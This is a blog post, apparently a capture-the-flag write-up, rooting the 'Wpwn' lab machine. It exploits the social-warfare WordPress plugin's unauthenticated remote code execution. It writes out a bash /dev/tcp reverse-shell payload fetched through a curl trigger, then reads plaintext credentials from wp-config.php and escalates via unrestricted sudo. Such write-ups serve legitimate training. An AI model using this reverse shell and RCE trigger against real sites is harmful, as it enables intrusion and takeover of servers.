<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wpwn - OSPG | Infomation Security - Blog</title><meta name="description" content="Summarysocial-warfare plugin of the target system is vulnerable to Unauthenticated Remote Code Execution. After obtained the initial access, we can then comp...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Cuong (Jay) Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/wpwn-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Wpwn - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/wpwn-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">Home</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Wpwn - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> September 10, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 5 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary"><strong>Summary</strong></h1><p><code class="language-plaintext highlighter-rouge">social-warfare</code> plugin of the target system is vulnerable to <strong>Unauthenticated Remote Code Execution</strong>. After obtained the initial access, we can then compromise a local user via <strong>plaintext credentials</strong> found in a <code class="language-plaintext highlighter-rouge">wordpress</code> config file. Finally, privilege escalation is achieved through misconfigured <code class="language-plaintext highlighter-rouge">sudo</code> permission.</p><hr><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We’ll begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> nmap/services.txt 192.168.162.123
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
</span></code></pre></div></div><p>Let’s us further investigate the <code class="language-plaintext highlighter-rouge">HTTP</code> service running on port 80.</p><h4 id="web-application"><strong>Web Application</strong></h4><p>Employ <code class="language-plaintext highlighter-rouge">ffuf</code> - a hidden web directories scanner as below.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-u</span> <span class="nv">$URL</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt | <span class="nb">tee </span>ffuf/http.txt
index.html              <span class="o">[</span>Status: 200, Size: 23, Words: 4, Lines: 4]
robots.txt              <span class="o">[</span>Status: 200, Size: 57, Words: 10, Lines: 3]
server-status           <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10]
wordpress               <span class="o">[</span>Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: <span class="o">[</span>4686/4686] :: Job <span class="o">[</span>1/1] :: 156 req/sec :: Duration: <span class="o">[</span>0:00:33] :: Errors: 0 ::
</code></pre></div></div><p>We found the <code class="language-plaintext highlighter-rouge">wordpress</code> directory appears interesting for additional enumerations.</p><h4 id="wpscan"><strong>WPScan</strong></h4><p>To effectively enumerate <code class="language-plaintext highlighter-rouge">wordpress</code>, we employ a tool called <code class="language-plaintext highlighter-rouge">wpscan</code>.</p><p>Let’s us see how we can use the tool to enumerate <strong>all users and available plugins</strong> of <code class="language-plaintext highlighter-rouge">wordpress</code>.</p><p>On the terminal, we run the following command</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://192.168.162.123/wordpress/ <span class="nt">-e</span> u,ap <span class="nt">-t</span> 10
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_| 
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18 
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[+] social-warfare
 | Location: http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |                                    
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)          
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.162.123/wordpress/, Match: '</span>Social Warfare v3.5.2<span class="s1">'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
...
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection) 
</span></code></pre></div></div><p>Analyzing the outputs, we discover the <code class="language-plaintext highlighter-rouge">social-warfare v3.5.2</code> plugin and the user <code class="language-plaintext highlighter-rouge">admin</code>.</p><p>Now, we drop our attention toward the plugin. That said, we can test whether it is commonly exploitable with <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit wordpress social warfare
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                              |  Path
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
WordPress Plugin Social Warfare &lt; 3.5.3 - Remote Code Execution                                                                                             | php/webapps/46794.py
<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="social-warfare--unauthenticated-rce"><strong><code class="language-plaintext highlighter-rouge">social-warfare</code> → Unauthenticated RCE</strong></h4><p>There is a high chance that our target is vulnerable to the attack. In order to test our theory, we run the following commands.</p><p>[1]. Create a file called <code class="language-plaintext highlighter-rouge">payload.txt</code>, which stores a reverse shell.</p><p>Example content of <code class="language-plaintext highlighter-rouge">payload.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre&gt;system<span class="o">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.49.162/53 0&gt;&amp;1"'</span><span class="o">)</span>&lt;/pre&gt;
</code></pre></div></div><p>[2]. Start a <code class="language-plaintext highlighter-rouge">HTTP</code> server using <code class="language-plaintext highlighter-rouge">python</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div><p>[3]. Trigger the payload.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.162.123/wordpress/wp-admin/admin-post.php<span class="se">\?</span><span class="nv">swp_debug</span><span class="o">=</span>load_options<span class="se">\&amp;</span><span class="nv">swp_url</span><span class="o">=</span>http://192.168.49.162/payload.txt
</code></pre></div></div><p>After the final command is executed, our <code class="language-plaintext highlighter-rouge">nc</code> listener should catch the reverse shell at port 80 as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 53                                                                                                                                                                           1 ⨯
listening on <span class="o">[</span>any] 53 ...
connect to <span class="o">[</span>192.168.49.162] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.123] 51492
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>514<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@wpwn:/var/www/html/wordpress/wp-admin<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="plaintext-password"><strong>Plaintext Password</strong></h4><p>The <code class="language-plaintext highlighter-rouge">wp-config.php</code> file divulges a plaintext password of a <code class="language-plaintext highlighter-rouge">wordpress</code> database.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@wpwn:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
&lt;?php
...
define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress_db'</span> <span class="o">)</span><span class="p">;</span>            
/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'wp_user'</span> <span class="o">)</span><span class="p">;</span>                       
/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'R3&amp;]vzhHmMn9,:-5'</span> <span class="o">)</span><span class="p">;</span>  
</code></pre></div></div><p>Try to login as <code class="language-plaintext highlighter-rouge">takis</code> user with the password, we are luckily secured a shell as <code class="language-plaintext highlighter-rouge">takis</code>.</p><h4 id="sudo-permisson"><strong>Sudo Permisson</strong></h4><p>From the <code class="language-plaintext highlighter-rouge">takis</code> shell, we can execute any <code class="language-plaintext highlighter-rouge">sudo</code> command</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@wpwn:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>takis on wpwn:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User takis may run the following commands on wpwn:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
</code></pre></div></div><p>and flexibly compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@wpwn:~<span class="nv">$ </span><span class="nb">sudo </span>su
root@wpwn:/home/takis# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2024 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>